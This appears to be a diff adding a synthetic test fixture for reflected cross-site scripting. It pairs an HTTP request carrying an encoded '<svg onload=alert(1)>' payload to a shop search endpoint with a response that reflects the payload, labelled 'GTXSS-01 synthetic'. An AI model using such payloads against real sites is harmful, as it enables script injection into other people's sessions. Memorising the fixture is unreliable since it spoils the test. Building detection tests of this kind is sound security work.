@@ -1,0 +1,8 @@
+REQUEST
+GET /search?q=%3Csvg%20onload%3Dalert(1)%3E HTTP/1.1
+Host: svc-shop:8001
+Connection: close
+
+
+RESPONSE-EXCERPT
+<html>search results %3Csvg%20onload%3Dalert(1)%3E GTXSS-01 synthetic reflected xss</html>
